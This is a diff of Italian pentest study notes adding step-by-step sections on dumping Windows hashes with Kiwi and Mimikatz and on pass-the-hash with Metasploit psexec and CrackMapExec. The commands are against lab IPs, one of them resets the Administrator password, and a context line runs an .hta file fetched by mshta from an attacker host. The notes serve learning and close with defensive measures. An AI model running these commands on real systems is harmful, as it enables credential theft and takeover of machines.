@@ -676,3 +676,149 @@ mshta.exe http://10.10.31.2:8080/Bn75U0NL8ONS.hta
 
 Sulla macchina attaccante viene aperta una reverse shell (per trovarla provare _sessions -i 1_).
 
+### Fare dump degli hash con Mimikatz o Kiwi
+
+Kiwi ha come vantaggio che viene eseguito in memoria quindi non lascia artefatti o tracce sul target come mimikatz che dev'essere scaricato.
+
+#### Primo step: exploitare un servizio vulnerabile per avere accesso al target
+
+Ad esempio qui di seguito i comandi per sfruttare una vulnerabilità presente per un servizio web BadBlue 2.7 in esecuzione sulla porta 80.
+
+```
+nmap -sV 10.2.18.199
+service postresql start && msfconsole
+search badblue
+use exploit/windows/(http/badblue_passthru
+set RHOSTS 10.2.18.199
+exploit
+sysinfo
+getuid
+pgrep lsass
+migrate 788
+getuid
+```
+
+#### Kiwi
+
+Kiwi è una built-in meterpreter extension.
+
+```
+load kiwi
+? //comando di help
+creds_all //creads_all per dumpare tutte le credenziali
+lsa_dump_sam
+lsa_dump_secrets
+```
+
+**creds\_all**: Possiamo vedere gli hash NTLM, wdigest e kerberos sono vuote, questo perché le versioni successive a Windows 8.1 non conservano password in cleartext in nessun modo.
+
+**lsa\_dump\_sam**: ci mostra tutti gli hash NTLM che sono presenti e la SysKey, che può tornare utile più tardi. Abbiamo anche la SAMKey.
+
+**lsa\_dump\_secrets**: ci restituisce la SysKey e in alcuni casi ci può fornire delle credenziali in cleartext.
+
+<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+Se si lavora con un ambiente Active Directory è possibile usare i comandi **kerberos\_ticket** e **golden\_ticket\_create**.
+
+> <p align="center"><strong>password_change</strong> è un po' troppo da fare in un pentest, perché significa cambiare password ad utenti in produzione. Quindi non bisogna farlo in casi reali di penetration test.</p>
+
+#### Mimikatz
+
+Mimikatz è un eseguibile che bisogna avere sulla macchina target. Kali Linux lo mette già a disposizione nella cartella **/usr/share/windows-resources/mimikatz/x64/mimikatz.exe**.
+
+Nella meterpreter session collegata alla vittima:
+
+<pre><code>pwd 
+cd C:\\
+mkdir Temp
+cd Temp
+upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
+shell
+  dir
+<strong>  .\mimikatz.exe
+</strong>  privilege::debug // se "20 OK" allora abbiamo i permessi per eseguire hash extraction from memory
+  lsadump::sam //ci restituisce SysKey, SAMKey, NTLM degli utenti, RID
+  lsadump::secrets
+  sekurlsa::logonpasswords // se presenti in memoria le password usate nei login
+</code></pre>
+
+**sekurlsa::logonpasswords**: Con mimikatz possiamo mostrare le logon password usate se il sistema è stato configurato per tenerle in memoria.
+
+### Pass-the-Hash attack
+
+#### Punto di partenza
+
+* Hai già una sessione su una macchina Windows (meterpreter) o solo l’hash.
+* Rete raggiungibile via SMB verso il target.
+
+#### Exploit di BadBlue (es. per ottenere una sessione SMB)
+
+```
+service postgresql start && msfconsole   //avvia Metasploit Framework
+search badblue
+use exploit/windows/http/badblue_passthru
+set RHOSTS <IP target>
+exploit
+// otteniamo una sessione attiva di meterpreter
+```
+
+#### Ottenere l'hash (se ho già la sessione attiva)
+
+In meterpreter trova il process id (PID) di lsass che è un processo a livello di sistema e usalo per migrare ai suoi privilegi:
+
+```
+pgrep lsass        # ottieni pid (es. 780)
+migrate 780
+getuid             # verifica NT AUTHORITY\SYSTEM
+```
+
+#### Estrarre l'hash con Kiwi o Mimikatz
+
+```
+load kiwi
+lsa_dump_sam   # o lsa_dump_secrets/hashdump
+hashdump
+```
+
+Salva le righe `username:LM:NTLM:RID` in un file .txt (es. `hashes.txt`).
+
+> Nota: se l'LM è non usato apparirà il placeholder `aad3b435b51404eeaad3b435b51404ee`.
+
+#### Scelta 1: Eseguire il pass-the-hash con psexec in MSF
+
+Anzitutto mettere la sessione precedente in background con CTRL+Z e poi usiamo il modulo psexec:
+
+```
+search psexec
+use exploit/windows/smb/psexec
+show options
+set LPORT 4422
+set RHOSTS <target_IP>
+set SMBUser Administrator
+set SMBPass <LM_Hash>:<NTLM_Hash>
+set target <tipo_target>   # es. Native\ upload o Command
+exploit
+```
+
+Se fallisce, prova a cambiare `target` (es. `Command`) o il metodo di upload.
+
+Se va a buon fine otterrai una sessione come `NT AUTHORITY\SYSTEM` sul target.
+
+#### Scelta 2: Eseguire il pass-the-hash con CrackMapExec
+
+```
+crackmapexec smb 10.2.28.132 -u Administrator -H <NTLM_Hash>
+crackmapexec smb 10.2.28.132 -u Administrator -H <NTLM_Hash> -x "whoami"
+crackmapexec smb 10.2.28.132 -u Administrator -H <NTLM_Hash> -x "ipconfig"
+crackmapexec smb 10.2.28.132 -u Administrator -H <NTLM_Hash> -x "net user administrator password123"
+```
+
+* CME accetta solo NTLM con `-H` (non serve LM).
+* Utile per eseguire comandi rapidi senza caricare meterpreter.
+
+#### Sicurezza e contromisure (breve)
+
+* Abilitare LSA protection / Credential Guard.
+* Disabilitare memorizzazione LM e usare policy forti.
+* Monitorare tentativi SMB e movimenti laterali.
+* Utilizzare MFA e credenziali gestite (LAPS).
